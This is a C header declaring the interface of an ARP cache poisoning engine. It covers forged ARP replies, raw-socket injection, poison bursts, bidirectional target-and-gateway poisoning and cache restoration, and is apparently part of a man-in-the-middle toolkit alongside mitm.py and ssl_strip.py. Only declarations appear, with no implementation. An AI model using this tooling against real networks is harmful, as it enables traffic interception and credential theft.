/**
 * arp_spoof.h - High-speed ARP cache poisoning engine
 *
 * Provides raw socket ARP packet construction and burst injection
 * for efficient ARP cache poisoning attacks. Used by mitm.py and
 * ssl_strip.py for MITM positioning.
 *
 * Linux-only. Requires CAP_NET_RAW or root.
 */

#ifndef ARP_SPOOF_H
#define ARP_SPOOF_H

#include <stdint.h>
#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/**
 * Build an ARP reply (gratuitous) packet with Ethernet header.
 *
 * Constructs a complete Ethernet + ARP reply frame ready for
 * raw socket injection. Used to poison target's ARP cache.
 *
 * @param buf           Output buffer (must be >= 42 bytes)
 * @param buf_size      Size of output buffer
 * @param src_mac       Attacker's MAC address (6 bytes)
 * @param src_ip        IP to impersonate (4 bytes, network byte order)
 * @param dst_mac       Target's MAC address (6 bytes)
 * @param dst_ip        Target's IP address (4 bytes, network byte order)
 * @return              Frame length on success (42), 0 on error
 */
__attribute__((visibility("default")))
size_t build_arp_reply(uint8_t *buf, size_t buf_size,
                       const uint8_t *src_mac, const uint8_t *src_ip,
                       const uint8_t *dst_mac, const uint8_t *dst_ip);

/**
 * Build a gratuitous ARP announcement (broadcast).
 *
 * @param buf           Output buffer (must be >= 42 bytes)
 * @param buf_size      Size of output buffer
 * @param src_mac       Sender MAC address (6 bytes)
 * @param src_ip        IP being announced (4 bytes, network byte order)
 * @return              Frame length on success (42), 0 on error
 */
__attribute__((visibility("default")))
size_t build_arp_gratuitous(uint8_t *buf, size_t buf_size,
                            const uint8_t *src_mac, const uint8_t *src_ip);

/**
 * Open a raw Ethernet socket for ARP injection.
 *
 * @param iface         Network interface name (e.g., "eth0")
 * @return              Socket fd on success, -1 on error
 */
__attribute__((visibility("default")))
int arp_open_socket(const char *iface);

/**
 * Close an ARP injection socket.
 *
 * @param sock_fd       Socket fd to close
 */
__attribute__((visibility("default")))
void arp_close_socket(int sock_fd);

/**
 * Send a burst of ARP poison packets to a target.
 *
 * Sends count ARP replies telling dst_ip that src_ip is at src_mac.
 * This poisons the target's ARP cache.
 *
 * @param sock_fd       Raw socket fd (from arp_open_socket)
 * @param src_mac       Attacker's MAC (6 bytes)
 * @param src_ip        IP to impersonate (4 bytes, network order)
 * @param dst_mac       Target's MAC (6 bytes)
 * @param dst_ip        Target's IP (4 bytes, network order)
 * @param count         Number of ARP replies to send
 * @param delay_us      Delay between packets in microseconds (0 = no delay)
 * @return              Number of packets sent, -1 on fatal error
 */
__attribute__((visibility("default")))
int arp_poison_burst(int sock_fd,
                     const uint8_t *src_mac, const uint8_t *src_ip,
                     const uint8_t *dst_mac, const uint8_t *dst_ip,
                     int count, int delay_us);

/**
 * Perform bidirectional ARP poisoning (target + gateway).
 *
 * Sends ARP replies to both target and gateway simultaneously,
 * positioning the attacker between them for full MITM.
 *
 * @param sock_fd       Raw socket fd
 * @param attacker_mac  Attacker's MAC (6 bytes)
 * @param target_mac    Target's MAC (6 bytes)
 * @param target_ip     Target's IP (4 bytes, network order)
 * @param gateway_mac   Gateway's MAC (6 bytes)
 * @param gateway_ip    Gateway's IP (4 bytes, network order)
 * @param count         Number of poison rounds
 * @param delay_us      Delay between packets in microseconds
 * @return              Total packets sent, -1 on fatal error
 */
__attribute__((visibility("default")))
int arp_poison_bidirectional(int sock_fd,
                             const uint8_t *attacker_mac,
                             const uint8_t *target_mac, const uint8_t *target_ip,
                             const uint8_t *gateway_mac, const uint8_t *gateway_ip,
                             int count, int delay_us);

/**
 * Restore ARP caches by sending correct MAC-IP mappings.
 *
 * @param sock_fd       Raw socket fd
 * @param target_mac    Target's real MAC (6 bytes)
 * @param target_ip     Target's IP (4 bytes, network order)
 * @param gateway_mac   Gateway's real MAC (6 bytes)
 * @param gateway_ip    Gateway's IP (4 bytes, network order)
 * @param count         Number of restore packets per direction
 * @return              Total packets sent, -1 on fatal error
 */
__attribute__((visibility("default")))
int arp_restore(int sock_fd,
                const uint8_t *target_mac, const uint8_t *target_ip,
                const uint8_t *gateway_mac, const uint8_t *gateway_ip,
                int count);

#ifdef __cplusplus
}
#endif

#endif /* ARP_SPOOF_H */
